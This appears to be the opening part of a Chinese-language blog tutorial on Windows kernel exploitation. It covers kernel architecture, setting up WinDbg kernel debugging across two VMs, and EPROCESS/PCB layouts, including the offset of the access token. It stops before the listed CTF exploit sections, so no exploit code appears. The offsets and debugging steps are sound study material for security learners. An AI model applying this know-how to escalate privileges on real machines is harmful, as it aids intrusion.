
  <!DOCTYPE html>
  <html lang="en"  >
  <head>
  <meta charset="utf-8">
  

  

  

  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
  
  <title>
    Windows Kernel exploitation - Part 1 |
    
    堇姬 Naup&#39;s Blog
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  
    <meta name="description" content="Windows Kernel exploitation - Part 1 Author: 堇姬Naup  What is Kernelkernel位於application和hardware之間，是OS的core也負責溝通hadware和process負責了像是I&#x2F;O、process、memory、driver managemet或是syscall 等事情 kernel也提供了可以跑ap">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows Kernel exploitation - Part 1">
<meta property="og:url" content="http://example.com/2025/04/02/Windows-Kernel-Exploitation-Part1/index.html">
<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
<meta property="og:description" content="Windows Kernel exploitation - Part 1 Author: 堇姬Naup  What is Kernelkernel位於application和hardware之間，是OS的core也負責溝通hadware和process負責了像是I&#x2F;O、process、memory、driver managemet或是syscall 等事情 kernel也提供了可以跑ap">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/BJ3oIxTVJe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B18B-GANJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJhi-GRE1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HytPzz0Eye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/By30_GAN1g.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ByXw5M0Nyl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hyrmnf0EJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkt8XZTNkl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyxIH5EpNyx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1ZnLBTEJx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJcrPBaN1g.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1ZnLBTEJx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hk722La41x.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkZadSRVye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyF4lNxB1x.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJHdl4lSke.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1yYU2AtJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkLtoh0Kke.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJTjeaAtJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1idz60tkl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkA7t60YJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hkk58fy5ye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1wd_NJqJx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJvcJUmckg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hku2Vilqyl.png">
<meta property="article:published_time" content="2025-04-02T11:33:49.000Z">
<meta property="article:modified_time" content="2025-04-02T11:36:15.661Z">
<meta property="article:author" content="Naup堇姬">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/BJ3oIxTVJe.png">
  
  
    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/fav.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">

  
  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>

  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        
          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg>
        
      </div>
      <div class="loading-word">Naup...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/">Home</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/archives">Archives</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/about">About</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
    
    
    
  </nav>
</div>
<header id="header">
  
    <picture></picture>
    <img fetchpriority="high" src="/images/posts_cover/Windows-kernel-exploitation/Windows-kernel-exploitation.webp" alt="Windows Kernel exploitation - Part 1">
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">Windows Kernel exploitation - Part 1</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content"  class="sidebar-right" >
          <aside id="sidebar">
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Kernel-exploitation-Part-1"><span class="toc-number">1.</span> <span class="toc-text">Windows Kernel exploitation - Part 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Kernel"><span class="toc-number">1.1.</span> <span class="toc-text">What is Kernel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kernel-exploit-on-windows"><span class="toc-number">1.2.</span> <span class="toc-text">Kernel exploit on windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.3.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#environment-setting"><span class="toc-number">1.4.</span> <span class="toc-text">environment setting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-debug-kernel-use-windbg-attach-kernel"><span class="toc-number">1.4.1.</span> <span class="toc-text">how to debug kernel(use windbg attach kernel)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Knowledge"><span class="toc-number">1.5.</span> <span class="toc-text">Basic Knowledge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#process"><span class="toc-number">1.5.1.</span> <span class="toc-text">process</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thread"><span class="toc-number">1.5.2.</span> <span class="toc-text">Thread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Integrity-Level"><span class="toc-number">1.5.3.</span> <span class="toc-text">Integrity Level</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACL"><span class="toc-number">1.5.4.</span> <span class="toc-text">ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SID"><span class="toc-number">1.5.5.</span> <span class="toc-text">SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-Token"><span class="toc-number">1.5.6.</span> <span class="toc-text">Access Token</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#primary-token"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">primary token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#impersonation-token"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">impersonation token</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#control-register-CPU-Control"><span class="toc-number">1.5.7.</span> <span class="toc-text">control register(CPU Control)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MMU-Memory-manager-unit"><span class="toc-number">1.5.8.</span> <span class="toc-text">MMU(Memory manager unit)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#page"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">page</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#page-table"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">page table</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTE"><span class="toc-number">1.5.9.</span> <span class="toc-text">PTE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demand-page"><span class="toc-number">1.5.9.1.</span> <span class="toc-text">demand page</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#page-fault"><span class="toc-number">1.5.9.2.</span> <span class="toc-text">page fault</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Swap-in-out"><span class="toc-number">1.5.9.3.</span> <span class="toc-text">Swap in&#x2F;out</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Virtual-address-to-Physical-address"><span class="toc-number">1.5.9.4.</span> <span class="toc-text">Virtual address to Physical address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-demo"><span class="toc-number">1.5.9.5.</span> <span class="toc-text">gdb demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-driver"><span class="toc-number">1.6.</span> <span class="toc-text">windows driver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IRP"><span class="toc-number">1.6.1.</span> <span class="toc-text">IRP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-install-windows-driver"><span class="toc-number">1.6.2.</span> <span class="toc-text">How to install windows driver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-use-your-driver"><span class="toc-number">1.6.3.</span> <span class="toc-text">how to use your driver</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Protection"><span class="toc-number">1.7.</span> <span class="toc-text">Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KASLR"><span class="toc-number">1.7.1.</span> <span class="toc-text">KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMEP"><span class="toc-number">1.7.2.</span> <span class="toc-text">SMEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMAP"><span class="toc-number">1.7.3.</span> <span class="toc-text">SMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KVA-shadow"><span class="toc-number">1.7.4.</span> <span class="toc-text">KVA shadow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Cookies"><span class="toc-number">1.7.5.</span> <span class="toc-text">Stack Cookies</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#information-leak"><span class="toc-number">1.8.</span> <span class="toc-text">information leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2usr"><span class="toc-number">1.9.</span> <span class="toc-text">ret2usr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-CTF-2019-Qual-breathofshadow"><span class="toc-number">1.10.</span> <span class="toc-text">HITCON CTF 2019 Qual breathofshadow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze"><span class="toc-number">1.10.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EoP"><span class="toc-number">1.10.2.</span> <span class="toc-text">EoP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug-and-install-windows-driver"><span class="toc-number">1.10.3.</span> <span class="toc-text">debug and install windows driver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%96%8B%E5%A7%8B-exploit-%E8%A7%80%E5%AF%9F"><span class="toc-number">1.10.4.</span> <span class="toc-text">開始 exploit - 觀察</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xor-Key"><span class="toc-number">1.10.5.</span> <span class="toc-text">Xor Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-kernel-base-and-stack-cookie"><span class="toc-number">1.10.6.</span> <span class="toc-text">leak kernel base and stack cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-ROP"><span class="toc-number">1.10.7.</span> <span class="toc-text">Kernel ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-SMAP-SMEP"><span class="toc-number">1.10.8.</span> <span class="toc-text">bypass SMAP&#x2F;SMEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jump-to-shellcode"><span class="toc-number">1.10.9.</span> <span class="toc-text">jump to shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script"><span class="toc-number">1.11.</span> <span class="toc-text">script</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">1.12.</span> <span class="toc-text">Demo</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">72</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">21</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
      
      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  <div class="sidebar-widget">
  
  </div>
</aside>

          <section id="main"><article id="post-Windows-Kernel-Exploitation-Part1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <a href="/2025/04/02/Windows-Kernel-Exploitation-Part1/" class="article-date-link" data-aos="zoom-in">
    <time datetime="2025-04-02T11:33:49.000Z" itemprop="datePublished">2025-04-02</time>
    <time style="display: none;" id="post-update-time">2025-04-02</time>
  </a>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id="Windows-Kernel-exploitation-Part-1"><a href="#Windows-Kernel-exploitation-Part-1" class="headerlink" title="Windows Kernel exploitation - Part 1"></a>Windows Kernel exploitation - Part 1</h1><blockquote>
<p>Author: 堇姬Naup</p>
</blockquote>
<h2 id="What-is-Kernel"><a href="#What-is-Kernel" class="headerlink" title="What is Kernel"></a>What is Kernel</h2><p>kernel位於application和hardware之間，是OS的core也負責溝通hadware和process<br>負責了像是<br>I&#x2F;O、process、memory、driver managemet或是syscall 等事情</p>
<p>kernel也提供了可以跑application的環境<br>application是run在ring3，而kernel則是ring0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">           +------------------+</span><br><span class="line">           |   Application    |</span><br><span class="line">           +------------------+</span><br><span class="line">                   |  ^</span><br><span class="line">                   v  |</span><br><span class="line">           +------------------+</span><br><span class="line">           |     Kernel       |</span><br><span class="line">           +------------------+</span><br><span class="line">           ^  ^          ^   ^</span><br><span class="line">           |  |          |   |</span><br><span class="line">   +-------+  |          |   +--------+</span><br><span class="line">   |          |          |            |</span><br><span class="line">+--v--+   +---v--+     +--v--+   +----v---+</span><br><span class="line">| CPU |   | RAM  |     | Disk |   |   ...  |</span><br><span class="line">+-----+   +------+     +------+   +--------+</span><br></pre></td></tr></table></figure>


<h2 id="Kernel-exploit-on-windows"><a href="#Kernel-exploit-on-windows" class="headerlink" title="Kernel exploit on windows"></a>Kernel exploit on windows</h2><p>target有像是driver或是kernel<br>driver:</p>
<ul>
<li>.sys</li>
<li>win32k.sys</li>
<li>srv2.sys</li>
<li>…</li>
</ul>
<p>kernel:</p>
<ul>
<li>C:\Windows\system32\ntoskrnl.exe</li>
</ul>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><img src="https://hackmd.io/_uploads/BJ3oIxTVJe.png" alt="image"></p>
<p>將它拆分成更細</p>
<ul>
<li>User Process: 就是我們平時在跑的應用程式等，都是一個process，像是browser、cmd.exe</li>
<li>subsystem DLL: 先看甚麼是subsystem，可以參考這篇<br><a target="_blank" rel="noopener" href="http://www.fmddlmyy.cn/text5.html">http://www.fmddlmyy.cn/text5.html</a><br>所有的win32 api呼叫都指向subsystem dll(kernel32.dll、kernelbase.dll、gdi32.dll、user32.dll、ntdll.dll、win32u.dll…)，api都在這實現</li>
<li>NTDLL: 從ring3 到ring0的入口所有win32 api調用了subsystem dll後會去調用ntdll.dll中函數實現(NTDLL.DLL exports the WindowsNative API)</li>
<li>Service Process: SCM(<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/services/service-control-manager)%E7%AE%A1%E7%90%86%E7%9A%84Process">https://learn.microsoft.com/zh-tw/windows/win32/services/service-control-manager)管理的Process</a></li>
<li>system process: 系統重要process(有很多)，被中止非常有機會BSOD</li>
<li>subsystem process: 控制圖形subsystem、manage process(csrss.exe)</li>
<li>win32k.sys: windows kernel driver，負責處理圖形及窗口管理(處理GDI)，<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-createwindowexa">https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-createwindowexa</a><br>這些由他處理</li>
<li>executive: Upper layer of Ntoskrnl.exe，I&#x2F;O、memory、Object manager</li>
<li>kernel: 處理更底層事務，像是interrupt等</li>
<li>device driver: 可以想像是程式對設備操作中間的介面，透過driver來去與device進行互動(A driver provides a software interface to hardware devices, enabling operating systems and other computer programs to access hardware functions without needing to know precise details about the hardware being used.)</li>
<li>HAL</li>
</ul>
<h2 id="environment-setting"><a href="#environment-setting" class="headerlink" title="environment setting"></a>environment setting</h2><p>HOST is windows 11 and user vmware + ubuntu 22.04 write exploit </p>
<ul>
<li>VMware + windows 24H2 VM (Need two windows to debug windows kernel)<br><a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-tw/software-download/windows11">https://www.microsoft.com/zh-tw/software-download/windows11</a></li>
<li>Process Monitor<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/sysinternals/downloads/procmon">https://learn.microsoft.com/zh-tw/sysinternals/downloads/procmon</a></li>
<li>Process Explore<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/sysinternals/downloads/process-explorer">https://learn.microsoft.com/zh-tw/sysinternals/downloads/process-explorer</a></li>
<li>Windbg<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/debugger/">https://learn.microsoft.com/zh-tw/windows-hardware/drivers/debugger/</a></li>
<li>PEbear<br><a target="_blank" rel="noopener" href="https://github.com/hasherezade/pe-bear">https://github.com/hasherezade/pe-bear</a></li>
</ul>
<h3 id="how-to-debug-kernel-use-windbg-attach-kernel"><a href="#how-to-debug-kernel-use-windbg-attach-kernel" class="headerlink" title="how to debug kernel(use windbg attach kernel)"></a>how to debug kernel(use windbg attach kernel)</h3><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-">ref1</a><br><a target="_blank" rel="noopener" href="https://scorpiosoftware.net/2023/03/07/levels-of-kernel-debugging/">ref2</a></p>
<p>Debug kernel需要兩台windows</p>
<p>先進VM<br>首先可以先下bcdedit，如果上面沒有debug代表沒開<br><img src="https://hackmd.io/_uploads/B18B-GANJg.png" alt="image"></p>
<p>去找到msconfig，選boot &gt; advanced option &gt; debug打開<br><img src="https://hackmd.io/_uploads/rJhi-GRE1e.png" alt="image"></p>
<p>現在你去下bcdedit就會有debug: on了，另外如果你確認時跳出boot secure問題，就要進去boot把它關掉<br><img src="https://hackmd.io/_uploads/HytPzz0Eye.png" alt="image"></p>
<p>有兩種debug方式，serial port跟net，這邊先用net方式debug<br>之後下這個command<br><code>bcdedit /DBGSETTINGS NET HOSTIP:IP PORT:50000  KEY:w.x.y.z</code></p>
<p>KEY是為了防止不要讓任何人都可以debug你的kernel<br>設好就重啟VM</p>
<p>現在回到你的HOST，用windbg的attack kernel，attach上去</p>
<p>如果你有看到attach kernel 代表成功了，不過有時候會失敗<br><img src="https://hackmd.io/_uploads/By30_GAN1g.png" alt="image"></p>
<p>所以我們試試看serial port</p>
<p><img src="https://hackmd.io/_uploads/ByXw5M0Nyl.png" alt="image"></p>
<p>之後就到attach kernel 的COM把資訊填上去就行</p>
<p>反正我們已經attach好了<br><img src="https://hackmd.io/_uploads/Hyrmnf0EJg.png" alt="image"></p>
<p>如果卡住按一下break就可以了</p>
<h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><p>附註: 以下的offset可能不同，實際情況用windbg直接追就可以了</p>
<p><a target="_blank" rel="noopener" href="https://codemachine.com/articles/kernel_structures.html">ref1</a></p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><p>甚麼是process應該不用解釋，當create process後會去call win32 API,<br>之後進到kernel層創建一個PCB(process control block)，記錄整個process的資訊<br>PCB不太完整，準確來說 struct是EPROCESS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">--------------------- 0x0</span><br><span class="line">|                   |</span><br><span class="line">|       PCB         |</span><br><span class="line">---------------------</span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- 0x440</span><br><span class="line">| Unique process id |</span><br><span class="line">--------------------- 0x448</span><br><span class="line">|Active process link|</span><br><span class="line">---------------------</span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- 0x4b8</span><br><span class="line">|       Token       |</span><br><span class="line">--------------------- </span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- 0x550 </span><br><span class="line">|       PEB         |</span><br><span class="line">--------------------- </span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- 0x5e0</span><br><span class="line">| Thread list head  |</span><br><span class="line">--------------------- </span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- </span><br></pre></td></tr></table></figure>

<ul>
<li>UID: process ID</li>
<li>Active process link: 將EPROCESS串成一個double linklst(process被串起來)<br><img src="https://hackmd.io/_uploads/rkt8XZTNkl.png" alt="image"></li>
<li>Token</li>
<li>PEB</li>
<li>Thread list head</li>
</ul>
<p>PCB裡面長這樣</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">---------------------</span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- 0x28</span><br><span class="line">| DirectoryTableBase|</span><br><span class="line">--------------------- </span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- 0x280</span><br><span class="line">|    Base Priority  |</span><br><span class="line">---------------------</span><br><span class="line">|       ...         |</span><br><span class="line">--------------------- 0x388</span><br><span class="line">|  User Directory   |</span><br><span class="line">|    Table base     |</span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>

<ul>
<li>DirectoryTableBase: PML4實體位址，context switch後變成cr3</li>
<li>User Directory Table Base: PML4實體位址，return到usermode時改為存放cr3</li>
</ul>
<p>至於cr3、PML4是甚麼在Virtual address to Physical address提到</p>
<h3 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h3><p>createThread時會創建<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</a></p>
<p>Thread間用linklist串在一起<br>跟process一樣創建一個ETHREAD，裡面的TCB(Thread control block)，負責管理整個thread</p>
<p>ETHREAD struct</p>
